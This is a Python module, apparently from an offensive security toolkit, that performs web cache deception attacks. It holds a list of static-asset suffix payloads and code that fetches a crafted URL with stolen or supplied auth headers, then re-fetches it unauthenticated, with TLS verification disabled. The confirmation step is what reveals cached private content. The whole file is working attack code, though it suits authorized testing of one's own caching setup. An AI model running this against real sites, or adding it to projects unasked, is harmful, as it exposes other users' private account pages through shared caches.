"""
Execution logic for web cache deception: fetch a crafted, static-looking
URL (built by appending a static-asset-like suffix to a path that should
require authentication) WITH an operator-supplied auth header/cookie, then
re-fetch the EXACT SAME URL WITHOUT it. If the second (unauthenticated)
response still contains the authenticated content, the cache stored and
is now serving a private page to anyone -- cache deception confirmed.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"

# Suffixes appended to the authenticated path that many caches treat as a
# static asset by extension alone, regardless of the real resource there.
DECEPTION_SUFFIXES = (
    "/nonexistent.css",
    "/nonexistent.js",
    ";nonexistent.css",
    "%2fnonexistent.css",
    "%252fnonexistent.css",
)


@dataclass
class DeceptionAttempt:
    suffix: str
    crafted_url: str
    authed_status: Optional[int] = None
    authed_body: str = ""      # FULL body -- parse.py truncates for display
    authed_marker_found: bool = False
    clean_status: Optional[int] = None
    clean_body: str = ""       # FULL body
    clean_marker_found: bool = False
    deception_confirmed: bool = False
    error: Optional[str] = None


def build_crafted_url(target_path_url: str, suffix: str) -> str:
    cleaned = target_path_url.rstrip("/")
    return f"{cleaned}{suffix}"


def attempt_suffix(
    target_path_url: str,
    suffix: str,
    auth_headers: Dict[str, str],
    success_marker: str,
    timeout: int = 10,
) -> DeceptionAttempt:
    crafted_url = build_crafted_url(target_path_url, suffix)
    attempt = DeceptionAttempt(suffix=suffix, crafted_url=crafted_url)

    req_headers = {"User-Agent": USER_AGENT}
    req_headers.update(auth_headers)

    try:
        authed_resp = requests.get(crafted_url, headers=req_headers, timeout=timeout, verify=False)
        attempt.authed_status = authed_resp.status_code
        attempt.authed_body = authed_resp.text or ""
        attempt.authed_marker_found = success_marker in attempt.authed_body
    except requests.RequestException as exc:
        attempt.error = f"authenticated request failed: {exc}"
        return attempt

    if not attempt.authed_marker_found:
        # The authenticated fetch didn't even return the private content
        # at this crafted URL -- nothing for a cache to have stored.
        return attempt

    try:
        clean_resp = requests.get(crafted_url, headers={"User-Agent": USER_AGENT}, timeout=timeout, verify=False)
        attempt.clean_status = clean_resp.status_code
        attempt.clean_body = clean_resp.text or ""
        attempt.clean_marker_found = success_marker in attempt.clean_body
        attempt.deception_confirmed = attempt.clean_marker_found
    except requests.RequestException as exc:
        attempt.error = f"clean (unauthenticated) request failed: {exc}"

    return attempt


def execute(
    target: str,
    success_marker: str,
    auth_headers: Optional[str] = None,
    timeout: int = 10,
) -> list:
    """One attempt_suffix() per DECEPTION_SUFFIXES entry. Tries all
    suffixes even after confirming deception on an earlier one, to report
    the full set of which URL shapes the cache treats as static."""
    if requests is None:
        return [DeceptionAttempt(suffix="", crafted_url="", error="requests library not available")]

    cleaned_target = (target or "").strip()
    if not cleaned_target:
        return [DeceptionAttempt(suffix="", crafted_url="", error="empty target provided")]
    if not cleaned_target.startswith(("http://", "https://")):
        cleaned_target = f"https://{cleaned_target}"

    header_dict: Dict[str, str] = {}
    if auth_headers:
        for line in auth_headers.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            k, _, v = line.partition(":")
            header_dict[k.strip()] = v.strip()

    return [
        attempt_suffix(cleaned_target, suffix, header_dict, success_marker, timeout=timeout)
        for suffix in DECEPTION_SUFFIXES
    ]
